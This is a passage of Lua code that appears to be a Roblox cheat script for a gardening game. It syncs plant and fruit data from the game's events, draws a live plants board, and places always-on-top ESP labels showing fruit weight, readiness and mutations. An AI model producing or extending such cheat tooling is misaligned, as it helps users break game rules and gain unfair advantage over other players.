		G.ConnectGardenControllerEventFruitFiltersDataSync("OnPlantGrowthUpdated", G.OnPlantGrowthUpdated)
		G.ConnectGardenControllerEventFruitFiltersDataSync("OnPlantAgeSync", G.OnPlantAgeSync)
		G.ConnectGardenControllerEventFruitFiltersDataSync("OnFruitAdded", G.OnFruitAdded)
		G.ConnectGardenControllerEventFruitFiltersDataSync("OnFruitRemoved", G.OnFruitRemoved)
		G.ConnectGardenControllerEventFruitFiltersDataSync("OnFruitGrowthUpdated", G.OnFruitGrowthUpdated)
		G.ConnectGardenControllerEventFruitFiltersDataSync("OnFruitAgeSync", G.OnFruitAgeSync)
		G.ConnectGardenRemote("PlantMutationUpdated", G.OnPlantMutationUpdated)
		G.ConnectGardenRemote("FruitMutationUpdated", G.OnFruitMutationUpdated)
		G.ConnectGardenRemote("SyncAllGardens", G.OnSyncAllGardens)
		if G.IsGardenLoadedFruitFiltersDataSync() then
			G.SyncFromGarden(true, true)
		else
			G.RequestGardenDataFruitFiltersDataSync()
			G.StartBaseDataLoaderFruitFiltersDataSync()
		end
		return true
	end;
	StopSync = function()
		local G = Z.FruitFiltersDataSync
		G.Started = false
		for G, V in ipairs(G.Connections) do
			if type(V) == "function" then
				pcall(V)
			elseif typeof(V) == "RBXScriptConnection" then
				pcall(function()
					V:Disconnect()
				end)
			elseif type(V) == "table" and type(V.Disconnect) == "function" then
				pcall(function()
					V:Disconnect()
				end)
			end
		end
		table.clear(G.Connections)
		G.MonitorStartedFruitFiltersDataSync = false
		G.FirstLoadStartedFruitFiltersDataSync = false
		return true
	end,
	ResetSync = function()
		local G = Z.FruitFiltersDataSync
		if G.Started then
			return false
		end
		G.Plants = {}
		G.Fruits = {}
		G.FruitKeysByPlantFruitFiltersDataSync = {}
		G.ReadyPlantsFruitFiltersDataSync = {}
		G.ReadyFruitsFruitFiltersDataSync = {}
		G.SnapshotLoadedFruitFiltersDataSync = false
		G.IndexesDirtyFruitFiltersDataSync = true
		G.IndexedGardenReferenceFruitFiltersDataSync = nil
		G.FirstLoadStartedFruitFiltersDataSync = false
		G.MonitorStartedFruitFiltersDataSync = false
		G.DataStateFruitFiltersDataSync = "waiting"
		return true
	end;
	OnSyncAllGardens = function()
		local G = Z.FruitFiltersDataSync
		G.IndexesDirtyFruitFiltersDataSync = true
		task.defer(function()
			if G.Started then
				G.SyncFromGarden(true, true)
			end
		end)
	end,
	OnPlantAdded = function(G, V, y)
		local j = Z.FruitFiltersDataSync
		if not j.IsMine(G) then
			return
		end
		local i = j.IndexPlantAndFruitsFruitFiltersDataSync(V, y)
		if i then
			j.SnapshotLoadedFruitFiltersDataSync = true
			j.DataStateFruitFiltersDataSync = "ready"
			j.LastGoodBaseDataFruitFiltersDataSync = j.Now()
		end
	end,
	OnPlantRemoved = function(G, V)
		local y = Z.FruitFiltersDataSync
		if not y.IsMine(G) then
			return
		end
		V = tostring(V or "")
		y.RemoveFruitIndexesForPlantFruitFiltersDataSync(V)
		y.ReadyPlantsFruitFiltersDataSync[V] = nil
		y.Plants[V] = nil
		if y.IsGardenLoadedFruitFiltersDataSync() and y.CountLocalPlantsFruitFiltersDataSync() <= 0 then
			y.DataStateFruitFiltersDataSync = "empty_new_player"
		end
	end,
	OnPlantGrowthUpdated = function(G, V, y, j, i, c, J)
		local T = Z.FruitFiltersDataSync
		if not T.IsMine(G) then
			return
		end
		local d = T.EnsurePlant(V)
		if not d then
			return
		end
		d.Age = T.N(y, d.Age or 0)
		d.CurrentAge = d.Age
		d.StableGrowthAmount = T.N(j, d.StableGrowthAmount or 0)
		d.BoostTimeRemaining = T.N(i, 0)
		d.PostBoostRate = T.N(c, d.StableGrowthAmount or 0)
		d.BoostSources = J
		T.UpdatePlantReadyIndexFruitFiltersDataSync(V, d)
	end,
	OnPlantAgeSync = function(G, V)
		local y = Z.FruitFiltersDataSync
		if not y.IsMine(G) or type(V) ~= "table" then
			return
		end
		for G, V in pairs(V) do
			local Z = y.EnsurePlant(G)
			if Z then
				Z.Age = y.N(V, Z.Age or 0)
				Z.CurrentAge = Z.Age
				y.UpdatePlantReadyIndexFruitFiltersDataSync(G, Z)
			end
		end
	end,
	OnPlantMutationUpdated = function(G, V, y)
		local j = Z.FruitFiltersDataSync
		if not j.IsMine(G) then
			return
		end
		local i = j.EnsurePlant(V)
		if i then
			if y == "" then
				i.Mutation = nil
			else
				i.Mutation = y
			end
		end
	end;
	OnFruitAdded = function(G, V, y, j)
		local i = Z.FruitFiltersDataSync
		if not i.IsMine(G) then
			return
		end
		local c = i.EnsureFruit(V, y, nil, j)
		if c then
			i.SnapshotLoadedFruitFiltersDataSync = true
			i.DataStateFruitFiltersDataSync = "ready"
		end
	end,
	OnFruitRemoved = function(G, V, y)
		local j = Z.FruitFiltersDataSync
		if not j.IsMine(G) then
			return
		end
		V = tostring(V or "")
		y = tostring(y or "")
		j.RemoveFruitIndexFruitFiltersDataSync(V, y)
		local i = j.Plants[V]
		if type(i) == "table" and type(i.Fruits) == "table" then
			i.Fruits[y] = nil
		end
	end;
	OnFruitGrowthUpdated = function(G, V, y, j, i)
		local c = Z.FruitFiltersDataSync
		if not c.IsMine(G) then
			return
		end
		local J = c.EnsureFruit(V, y)
		if not J then
			return
		end
		J.Age = c.N(j, J.Age or 0)
		J.CurrentAge = J.Age
		J.GrowRate = c.N(i, J.GrowRate or J.GrowthRate or 0)
		J.GrowthRate = J.GrowRate
		local T = c.Plants[tostring(V or "")]
		c.UpdateFruitReadyIndexFruitFiltersDataSync(V, y, T, J)
	end;
	OnFruitAgeSync = function(G, V, y)
		local j = Z.FruitFiltersDataSync
		if not j.IsMine(G) or type(y) ~= "table" then
			return
		end
		for G, y in pairs(y) do
			local Z = j.EnsureFruit(V, G)
			if Z then
				Z.Age = j.N(y, Z.Age or 0)
				Z.CurrentAge = Z.Age
				local i = j.Plants[tostring(V or "")]
				j.UpdateFruitReadyIndexFruitFiltersDataSync(V, G, i, Z)
			end
		end
	end,
	OnFruitOvertimeGrowthUpdated = function(G, V, y, j)
		local i = Z.FruitFiltersDataSync
		if not i.IsMine(G) then
			return
		end
		local c = i.EnsureFruit(V, y)
		if c then
			c.OvertimeGrowth = i.N(j, c.OvertimeGrowth or 1)
		end
	end,
	OnFruitMutationUpdated = function(G, V, y, j)
		local i = Z.FruitFiltersDataSync
		if not i.IsMine(G) then
			return
		end
		local c = i.EnsureFruit(V, y)
		if c then
			if j == "" then
				c.Mutation = nil
			else
				c.Mutation = j
			end
		end
	end
}
Z.FruitFiltersDataSync.StartSync()
g.PlantFruitEspStatusText = ""
g.PlantFruitEspUi = g.PlantFruitEspUi or {}
g.LivePlantsBoardEnabled = false
Z.LivePlantsBoard = {
	GuiLivePlantsBoard = nil;
	LabelLivePlantsBoard = nil,
	ScrollLivePlantsBoard = nil,
	StartedLivePlantsBoard = false;
	MaxTextLengthLivePlantsBoard = 180000;
	TruncatedTextLivePlantsBoard = "<font color=\'#FFCC66\'>Live plant list capped. Narrow your selected plants to show more.</font>";
	FormatNumberLivePlantsBoard = function(G)
		local V = string.format("%.2f", tonumber(G) or 0)
		return V:gsub("%.?0+$", "")
	end;
	GetTraitTextLivePlantsBoard = function(G)
		if type(G) ~= "table" then
			return ""
		end
		local V = tostring(G.Mutation or "")
		if V ~= "" then
			return V
		end
		local y = Z.FruitFiltersDataSync.GetVariant("", G.Variant)
		if y ~= "Normal" then
			return y
		end
		return ""
	end,
	GetSelectedPlantEntriesLivePlantsBoard = function()
		local G = h.plant_fruit_esp_names
		if Z.FruitFilters.IsSelectionEmpty(G) then
			return {}
		end
		local V = Z.FruitFiltersDataSync
		if V.SnapshotLoadedFruitFiltersDataSync ~= true then
			V.SyncFromGarden(false, true)
		end
		local y = {}
		for V, j in pairs(V.Plants) do
			local i = ""
			if type(j) == "table" then
				i = tostring(j.PlantName or "")
			end
			if i ~= "" and Z.FruitFilters.IsSelected(G, i) then
				table.insert(y, {
					id = tostring(V or ""),
					name = i,
					data = j
				})
			end
		end
		table.sort(y, function(G, V)
			if G.name ~= V.name then
				return G.name < V.name
			end
			return G.id < V.id
		end)
		return y
	end,
	BuildLivePlantsBoardText = function()
		local G = Z.FruitFiltersDataSync
		local V = {
			"<b>\240\159\140\177 Live Plants</b>"
		}
		local y = Z.LivePlantsBoard.TruncatedTextLivePlantsBoard
		local j = (Z.LivePlantsBoard.MaxTextLengthLivePlantsBoard - # y) - 1
		local i = # V[1]
		local c = false
		local function J(G)
			G = tostring(G or "")
			if (i + # G) + 1 > j then
				c = true
				return false
			end
			table.insert(V, G)
			i += # G + 1
			return true
		end
		if Z.FruitFilters.IsSelectionEmpty(h.plant_fruit_esp_names) then
			table.insert(V, "<font color=\'#FFCC66\'>Select plants to show here.</font>")
			return table.concat(V, "\n")
		end
		local T = Z.LivePlantsBoard.GetSelectedPlantEntriesLivePlantsBoard()
		if # T == 0 then
			table.insert(V, "<font color=\'#AAAAAA\'>No selected plants are currently active.</font>")
			return table.concat(V, "\n")
		end
		local d = tostring
		if Z.PlantFruitEsp and type(Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp) == "function" then
			d = Z.PlantFruitEsp.EscapeRichTextPlantFruitEsp
		end
		for V, y in ipairs(T) do
			if c then
				break
			end
			local j = y.data
			local i = y.name
			local T = "Common"
			if type(g.SeedRarity) == "table" and type(g.SeedRarity[i]) == "string" then
				T = g.SeedRarity[i]
			end
			local u = string.format("<font color=\'%s\'><b>%s</b></font>", Z.Data.GetRarityColor(T), d(i))
			local q = G.IsSingleHarvestPlant(i)
			local E = {}
			if not q and type(j.Fruits) == "table" then
				for V, y in pairs(j.Fruits) do
					if type(y) == "table" then
						table.insert(E, {
							id = tostring(V or y.FruitId or ""),
							data = y,
							ready = G.IsFruitReady(y),
							weight = G.GetWeightData(i, y, false)
						})
					end
				end
			end
			table.sort(E, function(G, V)
				if G.ready ~= V.ready then
					return G.ready
				end
				if G.weight.weight ~= V.weight.weight then
					return G.weight.weight > V.weight.weight
				end
				return G.id < V.id
			end)
			local a = math.max(math.floor(tonumber(j.MaxFruitSpawnLocations) or 0), 0)
			local H = tonumber(j.NextFruitSpawnTime) or 0
			if not q and (a > 0 and # E >= a) then
				u ..= " <font color=\'#AAAAAA\'>(fruit slot full)</font>"
			elseif not q and H > 0 then
				local V = math.max(math.floor(H - G.WallNow()), 0)
				local y = "next fruit ready"
				if V > 0 then
					y = "next fruit in " .. Z.SellManager.FormatDailyDealTime(V)
				end
				u ..= " <font color=\'#AAAAAA\'>(" .. (y .. ")</font>")
			end
			if not J("") then
				break
			end
			if not J(u) then
				break
			end
			local r = G.IsPlantReady(j)
			local Y = "#FFCC66"
			local e = "growing"
			if r then
				Y = "#7CFC00"
				e = "ready"
			end
			local s = d(y.id:sub(1, 8))
			local N = string.format("  <font color=\'#AAAAAA\'>%s</font> <font color=\'#FFFFFF\'>%s/%s</font> <font color=\'%s\'>(%s)</font> <font color=\'#AAAAAA\'>rate %s</font>", s, Z.LivePlantsBoard.FormatNumberLivePlantsBoard(j.Age or j.CurrentAge), Z.LivePlantsBoard.FormatNumberLivePlantsBoard(j.MaxAge), Y, e, Z.LivePlantsBoard.FormatNumberLivePlantsBoard(G.GetPlantGrowthRate(j)))
			local W = Z.LivePlantsBoard.GetTraitTextLivePlantsBoard(j)
			if W ~= "" then
				N ..= " <font color=\'#FFB347\'>" .. (d(W) .. "</font>")
			end
			if q then
				N ..= " <font color=\'#66CCFF\'>" .. (d((G.GetWeightData(i, j, true)).text) .. "</font>")
			end
			if not J(N) then
				break
			end
			if not q then
				if # E == 0 then
					if not J("  <font color=\'#777777\'>\226\128\162 No active fruit</font>") then
						break
					end
				else
					for G, V in ipairs(E) do
						local y = V.data
						local j = "#FFCC66"
						local i = "growing"
						if V.ready then
							j = "#7CFC00"
							i = "ready"
						end
						local c = string.format("  \226\128\162 <font color=\'#AAAAAA\'>%s</font> <font color=\'#66CCFF\'>%s</font> <font color=\'%s\'>(%s)</font> <font color=\'#AAAAAA\'>%s/%s rate %s</font>", d(V.id:sub(1, 8)), d(V.weight.text), j, i, Z.LivePlantsBoard.FormatNumberLivePlantsBoard(y.Age or y.CurrentAge), Z.LivePlantsBoard.FormatNumberLivePlantsBoard(y.MaxAge), Z.LivePlantsBoard.FormatNumberLivePlantsBoard(y.GrowRate or y.GrowthRate))
						local T = Z.LivePlantsBoard.GetTraitTextLivePlantsBoard(y)
						if T ~= "" then
							c ..= " <font color=\'#FFB347\'>" .. (d(T) .. "</font>")
						end
						if not J(c) then
							break
						end
					end
				end
			end
		end
		if c then
			table.insert(V, y)
		end
		return table.concat(V, "\n")
	end,
	EnsureLivePlantsBoard = function()
		if Z.LivePlantsBoard.GuiLivePlantsBoard and Z.LivePlantsBoard.GuiLivePlantsBoard.Parent then
			return true
		end
		local G = y.PlayerGui
		if not G and y.LocalPlayer then
			G = y.LocalPlayer:FindFirstChild("PlayerGui")
		end
		if not G then
			return false
		end
		local V = Instance.new("ScreenGui")
		V.Name, V.ResetOnSpawn, V.IgnoreGuiInset, V.DisplayOrder, V.Parent = "ExoLivePlantsBoard", false, true, 999997, G
		local j = Instance.new("Frame")
		j.Name, j.AnchorPoint, j.Position = "Board", Vector2.new(0, .5), UDim2.new(0, 10, .5, 0)
		j.Size, j.BackgroundColor3, j.BackgroundTransparency = UDim2.new(.42, - 20, .8, 0), Color3.fromRGB(10, 10, 10), .25
		j.BorderSizePixel, j.ClipsDescendants, j.Parent = 0, true, V
		local i = Instance.new("UICorner")
		i.CornerRadius, i.Parent = UDim.new(0, 8), j
		local c = Instance.new("UIStroke")
		c.Color, c.Thickness, c.Transparency, c.Parent = Color3.fromRGB(45, 80, 210), 1.5, .15, j
		local J = Instance.new("ScrollingFrame")
		J.Name, J.BackgroundTransparency, J.BorderSizePixel = "List", 1, 0
		J.Position, J.Size, J.CanvasSize = UDim2.fromOffset(10, 10), UDim2.new(1, - 20, 1, - 20), UDim2.fromOffset(0, 0)
		J.ScrollBarThickness, J.Parent = 4, j
		local T = Instance.new("TextLabel")
		T.Name, T.BackgroundTransparency, T.Position = "Text", 1, UDim2.fromOffset(0, 0)
		T.Size, T.AutomaticSize, T.Font, T.RichText = UDim2.new(1, - 8, 0, 0), Enum.AutomaticSize.Y, Enum.Font.Code, true
		T.TextWrapped, T.TextXAlignment, T.TextYAlignment = false, Enum.TextXAlignment.Left, Enum.TextYAlignment.Top
		T.TextSize, T.TextColor3, T.Parent = 17, Color3.fromRGB(255, 255, 255), J
		Z.LivePlantsBoard.GuiLivePlantsBoard = V
		Z.LivePlantsBoard.LabelLivePlantsBoard = T
		Z.LivePlantsBoard.ScrollLivePlantsBoard = J
		return true
	end;
	RefreshLivePlantsBoard = function()
		if g.LivePlantsBoardEnabled ~= true then
			if Z.LivePlantsBoard.GuiLivePlantsBoard then
				Z.LivePlantsBoard.GuiLivePlantsBoard.Enabled = false
			end
			return false
		end
		if not Z.LivePlantsBoard.EnsureLivePlantsBoard() then
			return false
		end
		local G = Z.LivePlantsBoard.GuiLivePlantsBoard
		local V = Z.LivePlantsBoard.LabelLivePlantsBoard
		local y = Z.LivePlantsBoard.ScrollLivePlantsBoard
		if G then
			G.Enabled = true
		end
		if V then
			V.Text = Z.LivePlantsBoard.BuildLivePlantsBoardText()
			if y then
				y.CanvasSize = UDim2.fromOffset(0, math.max(V.TextBounds.Y + 20, y.AbsoluteSize.Y))
			end
		end
		return true
	end;
	StartLivePlantsBoard = function()
		if Z.LivePlantsBoard.StartedLivePlantsBoard then
			return false
		end
		Z.LivePlantsBoard.StartedLivePlantsBoard = true
		task.spawn(function()
			while not g.is_forced_stop do
				if g.LivePlantsBoardEnabled == true then
					local G, V = pcall(Z.LivePlantsBoard.RefreshLivePlantsBoard)
					if not G then
						warn("[LivePlantsBoard]", V)
					end
				end
				task.wait(1)
			end
		end)
		return true
	end
}
Z.PlantFruitEsp = {
	StartedPlantFruitEsp = false;
	GuiFolderPlantFruitEsp = nil;
	AnchorFolderPlantFruitEsp = nil,
	AnchorFolderNamePlantFruitEsp = "ExoPlantFruitEspAnchors",
	AnchorKeyAttributePlantFruitEsp = "ExoPlantFruitEspKey",
	DataAnchorsPlantFruitEsp = {},
	BillboardsPlantFruitEsp = {};
	LastScanPlantFruitEsp = 0;
	LastCountPlantFruitEsp = {
		plants = 0;
		fruits = 0
	};
	SetStatusPlantFruitEsp = function(G, V)
		G = tostring(G or "")
		V = tostring(V or "#FFFFFF")
		g.PlantFruitEspStatusText = G ~= "" and string.format("<font color=\'%s\'>%s</font>", V, G) or ""
		local y = g.PlantFruitEspUi
		if type(y) == "table" and (y.StatusLabel and type(y.StatusLabel.SetText) == "function") then
			y.StatusLabel:SetText(g.PlantFruitEspStatusText ~= "" and g.PlantFruitEspStatusText or "<font color=\'#888888\'>ESP idle</font>")
		end
	end,
	EnsureFolderPlantFruitEsp = function()
		if Z.PlantFruitEsp.GuiFolderPlantFruitEsp and Z.PlantFruitEsp.GuiFolderPlantFruitEsp.Parent then
			return Z.PlantFruitEsp.GuiFolderPlantFruitEsp
		end
		local G = y.PlayerGui and y.PlayerGui:FindFirstChild("ExoPlantFruitEsp")
		if G then
			G:Destroy()
		end
		local V = Instance.new("Folder")
		V.Name = "ExoPlantFruitEsp"
		V.Parent = y.PlayerGui
		Z.PlantFruitEsp.GuiFolderPlantFruitEsp = V
		return V
	end,
	IsAnyEnabledPlantFruitEsp = function()
		return h.plant_fruit_esp_fruit_enabled == true or h.plant_fruit_esp_plant_enabled == true
	end;
	EscapeRichTextPlantFruitEsp = function(G)
		G = tostring(G or "")
		G = G:gsub("&", "&amp;")
		G = G:gsub("<", "&lt;")
		G = G:gsub(">", "&gt;")
		return G
	end,
	IsSelectionEmptyPlantFruitEsp = function(G)
		if type(G) ~= "table" then
			return true
		end
		for G, V in pairs(G) do
			if type(G) == "number" and tostring(V or "") ~= "" then
				return false
			end
			if type(G) ~= "number" and (V ~= nil and (V ~= false and tostring(G or "") ~= "")) then
				return false
			end
		end
		return true
	end,
	IsSelectedPlantFruitEsp = function(G, V)
		V = tostring(V or "")
		if V == "" or type(G) ~= "table" then
			return false
		end
		if G[V] ~= nil and G[V] ~= false then
			return true
		end
		for G, y in pairs(G) do
			if type(G) == "number" and tostring(y or "") == V then
				return true
			end
			if tostring(G or "") == V and (y ~= nil and y ~= false) then
				return true
			end
		end
		return false
	end,
	PassesNamePlantFruitEsp = function(G)
		G = tostring(G or "")
		if G == "" then
			return false
		end
		if Z.PlantFruitEsp.IsSelectionEmptyPlantFruitEsp(h.plant_fruit_esp_names) then
			return true
		end
		return Z.PlantFruitEsp.IsSelectedPlantFruitEsp(h.plant_fruit_esp_names, G)
	end,
	GetAllNameSelectionPlantFruitEsp = function()
		local G = {}
		for V, y in ipairs(g.AllSeedsDataTable or {}) do
			local Z = type(y) == "table" and tostring(y.name or "") or ""
			if Z ~= "" then
				G[Z] = true
			end
		end
		return G
	end;
	PassesKgPlantFruitEsp = function(G)
		G = tonumber(G) or 0
		local V = math.max(tonumber(h.plant_fruit_esp_min_kg) or 0, 0)
		local y = tonumber(h.plant_fruit_esp_max_kg) or 1000000000
		if y < V then
			return false
		end
		return G >= V and G <= y
	end,
	FormatKgPlantFruitEsp = function(G)
		G = tonumber(G) or 0
		if type(Z.FruitFiltersDataSync) == "table" and type(Z.FruitFiltersDataSync.FormatKg) == "function" then
			local V, y = pcall(function()
				return Z.FruitFiltersDataSync.FormatKg(G)
			end)
			if V and type(y) == "string" then
				return y
			end
		end
		return string.format("%.2fkg", math.floor((G * 100) + .5) / 100)
	end,
	GetSyncPlantPlantFruitEsp = function(G)
		G = tostring(G or "")
		local V = Z.FruitFiltersDataSync
		if G == "" or type(V) ~= "table" or type(V.Plants) ~= "table" then
			return nil
		end
		if not V.Started and type(V.StartSync) == "function" then
			V.StartSync()
		end
		local y = V.Plants[G]
		return type(y) == "table" and y or nil
	end,
	GetSyncFruitPlantFruitEsp = function(G, V)
		V = tostring(V or "")
		if V == "" then
			return nil
		end
		local y = Z.PlantFruitEsp.GetSyncPlantPlantFruitEsp(G)
		if type(y) ~= "table" or type(y.Fruits) ~= "table" then
			return nil
		end
		local j = y.Fruits[V]
		return type(j) == "table" and j or nil
	end;
	GetKgPlantFruitEsp = function(G, V, j, i, c)
		G = tostring(G or "")
		V = tostring(V or "")
		j = tostring(j or "")
		local J = c and Z.PlantFruitEsp.GetSyncPlantPlantFruitEsp(V) or Z.PlantFruitEsp.GetSyncFruitPlantFruitEsp(V, j)
		if type(J) == "table" and (type(Z.FruitFiltersDataSync) == "table" and type(Z.FruitFiltersDataSync.GetWeightData) == "function") then
			local V, y = pcall(function()
				return Z.FruitFiltersDataSync.GetWeightData(G, J, c == true)
			end)
			if V and type(y) == "table" then
				return tonumber(y.weight) or 0, tostring(y.text or Z.PlantFruitEsp.FormatKgPlantFruitEsp(y.weight))
			end
		end
		if typeof(i) == "Instance" and type(y.FruitVisualizerController) == "table" then
			local G, V = pcall(function()
				if c and type(y.FruitVisualizerController.CalculatePlantWeight) == "function" then
					return y.FruitVisualizerController:CalculatePlantWeight(i)
				end
				if type(y.FruitVisualizerController.CalculateFruitWeight) == "function" then
					return y.FruitVisualizerController:CalculateFruitWeight(i)
				end
				return nil
			end)
			if G and tonumber(V) then
				local G = math.floor((((tonumber(V) or 0)) * 100) + .5) / 100
				return G, Z.PlantFruitEsp.FormatKgPlantFruitEsp(G)
			end
		end
		return 0, "0.00kg"
	end,
	GetPlantLengthPlantFruitEsp = function(G, V)
		local y
		if type(G) == "table" then
			y = tonumber(G.Height or G.Length or G.PlantLength)
		end
		if not y and (typeof(V) == "Instance" and V.Parent) then
			y = tonumber(V:GetAttribute("Height") or V:GetAttribute("Length") or V:GetAttribute("PlantLength"))
		end
		return math.max(math.floor(((y or 0)) + .5), 0)
	end,
	GetPlantKeyPlantFruitEsp = function(G)
		return "plant:" .. tostring(G or "")
	end;
	GetFruitKeyPlantFruitEsp = function(G, V)
		return "fruit:" .. (tostring(G or "") .. (":" .. tostring(V or "")))
	end;
	GetDataWorldPositionPlantFruitEsp = function(G)
		local V
		if type(G) == "table" then
			V = G.Positions
		end
		local y = Z.Farm.GetSpawnPoint()
		if type(V) ~= "table" or typeof(y) ~= "Instance" or not y:IsA("BasePart") then
			return nil
		end
		local j = tonumber(V.PosX)
		local i = tonumber(V.PosY)
		local c = tonumber(V.PosZ)
		if not j or not i or not c then
			return nil
		end
		return y.CFrame:PointToWorldSpace(Vector3.new(j, i, c))
	end,
	GetPhysicalLookupPlantFruitEsp = function()
		local G = {}
		local V = {}
		local y = Z.Farm.GetPlants()
		for y, j in ipairs(y) do
			if typeof(j) ~= "Instance" or not j.Parent then
				continue
			end
			local i = tostring(j:GetAttribute("PlantId") or "")
			if i ~= "" then
				G[i] = j
			end
			local c = j:FindFirstChild("Fruits")
			if c then
				for G, y in ipairs(c:GetChildren()) do
					local j = tostring(y:GetAttribute("FruitId") or "")
					if i ~= "" and j ~= "" then
						V[Z.PlantFruitEsp.GetFruitKeyPlantFruitEsp(i, j)] = y
					end
				end
			end
		end
		return G, V, y
	end;
	EnsureAnchorFolderPlantFruitEsp = function()
		local G = Z.PlantFruitEsp
		if G.AnchorFolderPlantFruitEsp and G.AnchorFolderPlantFruitEsp.Parent then
			return G.AnchorFolderPlantFruitEsp
		end
		local V = y.Workspace:FindFirstChild(G.AnchorFolderNamePlantFruitEsp)
		if V then
			V:Destroy()
		end
		local j = Instance.new("Folder")
		j.Name = G.AnchorFolderNamePlantFruitEsp
		j.Parent = y.Workspace
		G.AnchorFolderPlantFruitEsp = j
		return j
	end;
	EnsureDataAnchorPlantFruitEsp = function(G, V)
		if type(G) ~= "string" or G == "" or typeof(V) ~= "Vector3" then
			return nil
		end
		local y = Z.PlantFruitEsp
		local j = y.DataAnchorsPlantFruitEsp[G]
		if typeof(j) == "Instance" and j.Parent then
			j.Position = V
			return j
		end
		j = Instance.new("Part")
		j.Name = "DataAnchor"
		j.Size = Vector3.new(.1, .1, .1)
		j.Position = V
		j.Transparency = 1
		j.Anchored = true
		j.CanCollide = false
		j.CanQuery = false
		j.CanTouch = false
		j.CastShadow = false
		j:SetAttribute(y.AnchorKeyAttributePlantFruitEsp, G)
		j.Parent = y.EnsureAnchorFolderPlantFruitEsp()
		y.DataAnchorsPlantFruitEsp[G] = j
		return j
	end,
	GetAdorneePlantFruitEsp = function(G)
		if typeof(G) ~= "Instance" then
			return nil
		end
		if G:IsA("BasePart") then
			return G
		end
		if G:IsA("Model") then
			local V = G:FindFirstChild("HarvestPart")
			if V and V:IsA("BasePart") then
				return V
			end
			if G.PrimaryPart then
				return G.PrimaryPart
			end
			return G:FindFirstChildWhichIsA("BasePart", true)
		end
		return nil
	end,
	GetOffsetPlantFruitEsp = function(G, V, y)
		if G == "plant" then
			return Vector3.new(0, math.clamp(((tonumber(V) or 0)) + 1.5, 2, 12), 0)
		end
		y = math.max(math.floor(tonumber(y) or 1), 1)
		return Vector3.new(0, 1.35 + (((y - 1)) * 1.8), 0)
	end;
	EnsureBillboardPlantFruitEsp = function(G, V, y)
		local j = Z.PlantFruitEsp.EnsureFolderPlantFruitEsp()
		local i = Z.PlantFruitEsp.BillboardsPlantFruitEsp[G]
		if i and (i.Gui and (i.Gui.Parent and (i.Label and i.Label.Parent))) then
			return i
		end
		local c = Instance.new("BillboardGui")
		c.Name = "ExoPlantFruitEspBillboard"
		c.AlwaysOnTop = true
		c.LightInfluence = 0
		c.Size = UDim2.fromOffset(155, 38)
		c.MaxDistance = math.max(tonumber(h.plant_fruit_esp_max_distance) or 250, 25)
		c.Parent = j
		local J = Instance.new("TextLabel")
		J.Name = "Text"
		J.BackgroundTransparency = 1
		J.BorderSizePixel = 0
		J.Font = Enum.Font.GothamSemibold
		J.RichText = true
		J.Size = UDim2.fromScale(1, 1)
		J.Text = ""
		J.TextColor3 = Color3.fromRGB(255, 255, 255)
		J.TextScaled = false
		J.TextSize = 12
		J.TextStrokeTransparency = 1
		J.TextWrapped = true
		J.TextXAlignment = Enum.TextXAlignment.Center
		J.TextYAlignment = Enum.TextYAlignment.Center
		J.Parent = c
		i = {
			Gui = c;
			Label = J;
			LastText = "",
			Seen = false
		}
		Z.PlantFruitEsp.BillboardsPlantFruitEsp[G] = i
		return i
	end;
	UpdateBillboardPlantFruitEsp = function(G, V, y, j, i)
		if typeof(G) ~= "Instance" or not G.Parent then
			return false
		end
		y = tostring(y or "")
		if y == "" then
			return false
		end
		local c = Z.PlantFruitEsp.GetAdorneePlantFruitEsp(G)
		if not c then
			return false
		end
		local J = Z.PlantFruitEsp.EnsureBillboardPlantFruitEsp(G, V, j)
		J.Seen = true
		J.Gui.Adornee = c
		J.Gui.StudsOffsetWorldSpace = Z.PlantFruitEsp.GetOffsetPlantFruitEsp(V, j, i)
		J.Gui.MaxDistance = math.max(tonumber(h.plant_fruit_esp_max_distance) or 250, 25)
		if J.LastText ~= y then
			J.LastText = y
			J.Label.Text = y
		end
		return true
	end,
	RemoveBillboardPlantFruitEsp = function(G)
		local V = Z.PlantFruitEsp
		local y = V.BillboardsPlantFruitEsp[G]
		if y and y.Gui then
			pcall(function()
				y.Gui:Destroy()
			end)
		end
		if typeof(G) == "Instance" then
			local y = G:GetAttribute(V.AnchorKeyAttributePlantFruitEsp)
			if type(y) == "string" and y ~= "" then
				V.DataAnchorsPlantFruitEsp[y] = nil
				pcall(function()
					G:Destroy()
				end)
			end
		end
		V.BillboardsPlantFruitEsp[G] = nil
	end,
	CleanupPlantFruitEsp = function(G)
		for V, y in pairs(Z.PlantFruitEsp.BillboardsPlantFruitEsp) do
			if G == true or typeof(V) ~= "Instance" or not V.Parent or type(y) ~= "table" or y.Seen ~= true then
				Z.PlantFruitEsp.RemoveBillboardPlantFruitEsp(V)
			elseif y then
				y.Seen = false
			end
		end
		if G == true and Z.PlantFruitEsp.GuiFolderPlantFruitEsp then
			pcall(function()
				Z.PlantFruitEsp.GuiFolderPlantFruitEsp:Destroy()
			end)
			Z.PlantFruitEsp.GuiFolderPlantFruitEsp = nil
		end
		if G == true and Z.PlantFruitEsp.AnchorFolderPlantFruitEsp then
			pcall(function()
				Z.PlantFruitEsp.AnchorFolderPlantFruitEsp:Destroy()
			end)
			Z.PlantFruitEsp.AnchorFolderPlantFruitEsp = nil
			table.clear(Z.PlantFruitEsp.DataAnchorsPlantFruitEsp)
		end
	end,
	GetVariantColourPlantFruitEsp = function(G)
		G = tostring(G or "")
		if G == "Rainbow" then
			return "#FF55FF"
		end
		if G == "Gold" then
			return "#FFD700"
		end
		return "#CFCFCF"
	end;
	GetMutationInfoPlantFruitEsp = function(G, V, y)
		G = type(G) == "table" and G or {}
		y = type(y) == "table" and y or {}
		local j = tostring(G.Mutation or y.Mutation or "")
		local i = G.Variant or y.Variant
		local c = Z.FruitFiltersDataSync
		if typeof(V) == "Instance" then
			if j == "" then
				j = tostring(V:GetAttribute("Mutation") or V:GetAttribute("FruitMutation") or V:GetAttribute("PlantMutation") or "")
			end
			if i == nil or tostring(i or "") == "" then
				i = V:GetAttribute("Variant") or V:GetAttribute("FruitVariant") or V:GetAttribute("PlantVariant")
			end
		end
		if type(c) == "table" and type(c.MutationText) == "function" then
			local G, V = pcall(c.MutationText, j)
			if G then
				j = tostring(V or "")
			end
		end
		if type(c) == "table" and type(c.GetVariant) == "function" then
			local G, V = pcall(c.GetVariant, j, i)
			if G then
				i = tostring(V or "Normal")
			end
		else
			i = tostring(i or "Normal")
			if i == "" then
				i = "Normal"
			end
		end
		return j, i
	end,
	BuildTraitTextPlantFruitEsp = function(G, V)
		local y = {}
		G = tostring(G or "")
		V = tostring(V or "")
		if G ~= "" then
